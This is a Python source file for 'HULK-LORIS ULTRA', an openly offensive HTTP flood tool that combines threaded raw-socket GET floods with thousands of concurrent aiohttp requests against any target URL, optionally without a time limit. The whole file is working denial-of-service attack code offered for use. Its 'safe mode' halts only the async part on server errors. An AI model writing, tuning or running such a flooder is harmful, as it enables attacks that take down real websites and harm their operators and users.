#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------------
# HULK-LORIS ULTRA - Massively Concurrent HTTP Flood
# ----------------------------------------------------------------------------------------------

import sys
import socket
import time
import random
import threading
import asyncio
import aiohttp
import uvloop
import argparse
from urllib.parse import urlparse

# Global counters and flags
request_counter = 0
failed_counter = 0
active_connections = 0
max_rps = 0
attack_running = True

# --- Configuration Variables ---
target_domain = ""
target_ip = ""
port = 80
use_https = False
num_workers = 1000
duration = 0
safe_mode = True # Default to safe mode for non-interactive use

# Low-level socket flood function (10x faster than HTTP)
def raw_socket_flood():
    global request_counter, active_connections
    flood_target = target_ip if target_ip else target_domain
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((flood_target, port))
            active_connections += 1

            request = f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n"
            request += f"Host: {target_domain}\r\n"
            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: keep-alive\r\n\r\n"

            s.send(request.encode())
            request_counter += 1
        except:
            pass
        finally:
            s.close()
            active_connections -= 1

# Async HTTP flood with aiohttp (massive concurrency)
async def async_http_flood(session):
    global request_counter, failed_counter
    try:
        url = f"http{'s' if use_https else ''}://{target_domain}:{port}/?{random.randint(0,9999999)}"
        async with session.get(url, timeout=1, ssl=False) as response:
            request_counter += 1
            # In safe mode, we stop if the server starts returning errors,
            # as our goal is just to demonstrate the effect, not cause damage.
            if response.status >= 500 and safe_mode:
                return True
    except:
        failed_counter += 1
    return False

async def async_attack_controller():
    # The connector needs to be created inside the loop's context
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(num_workers):
            task = asyncio.create_task(async_http_flood(session))
            tasks.append(task)

        results = await asyncio.gather(*tasks)
        if any(results): # If any task returned True (safe mode triggered)
            global attack_running
            print("\n[SAFE MODE] Server error detected. Stopping attack.")
            attack_running = False

# Monitor and stats display
def stats_monitor():
    global max_rps
    last_count = 0
    start_time = time.time()
    while attack_running:
        time.sleep(1)
        current_rps = request_counter - last_count
        last_count = request_counter
        max_rps = max(max_rps, current_rps)
        elapsed_time = int(time.time() - start_time)
        print(f"[STATS] Time: {elapsed_time}s | RPS: {current_rps}/s | Total: {request_counter} | Failed: {failed_counter} | Max RPS: {max_rps}", end='\r')

# Main function
def main():
    global attack_running, target_domain, target_ip, port, use_https, num_workers, duration

    parser = argparse.ArgumentParser(description="HULK-LORIS ULTRA - Massively Concurrent HTTP Flood")
    parser.add_argument("url", nargs='?', help="Full target URL (e.g., https://localhost:8443)")
    parser.add_argument("-w", "--workers", type=int, default=1000, help="Number of concurrent workers (default: 1000)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Attack duration in seconds (0 for infinite, default: 0)")
    args = parser.parse_args()

    if not args.url:
        print("Usage: python3 HULK-LORIS-ULTRA.py <URL> [-w WORKERS] [-d DURATION]")
        print("Example: python3 HULK-LORIS-ULTRA.py https://localhost:8443 -w 2000 -d 60")
        sys.exit(0)

    # Parse URL
    try:
        parsed_url = urlparse(args.url)
        target_domain = parsed_url.hostname
        port = parsed_url.port
        use_https = parsed_url.scheme == 'https'
        if not port:
            port = 443 if use_https else 80
        # Resolve IP for raw socket part
        target_ip = socket.gethostbyname(target_domain)
    except Exception as e:
        print(f"[!] Invalid URL specified: {e}")
        sys.exit(1)

    num_workers = args.workers
    duration = args.duration

    print("\n" + "="*60)
    print("           HULK-LORIS ULTRA - MASSIVE CONCURRENT FLOOD")
    print("="*60)
    print(f"Target: {target_domain}:{port}")
    print(f"Protocol: {'HTTPS' if use_https else 'HTTP'}")
    print(f"Workers: {num_workers}")
    print(f"Duration: {'Infinite' if duration == 0 else f'{duration}s'}")
    print("="*60)
    print("\n[+] Initializing attack...")

    # Start stats monitor
    monitor_thread = threading.Thread(target=stats_monitor, daemon=True)
    monitor_thread.start()

    # Start raw socket flood (base layer)
    socket_threads = []
    for _ in range(min(num_workers // 2, 1000)):
        t = threading.Thread(target=raw_socket_flood, daemon=True)
        t.start()
        socket_threads.append(t)

    # Start async HTTP flood (main attack)
    uvloop.install()
    try:
        if duration > 0:
            end_time = time.time() + duration
            while time.time() < end_time and attack_running:
                asyncio.run(async_attack_controller())
        else:
            while attack_running:
                asyncio.run(async_attack_controller())
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        attack_running = False
        time.sleep(1) # Let monitor print final stats
        print(f"\n\n[+] Attack finished!")
        print(f"[+] Total requests: {request_counter}")
        print(f"[+] Maximum RPS: {max_rps}/second")
        print(f"[+] Failed requests: {failed_counter}")

if __name__ == "__main__":
    main()
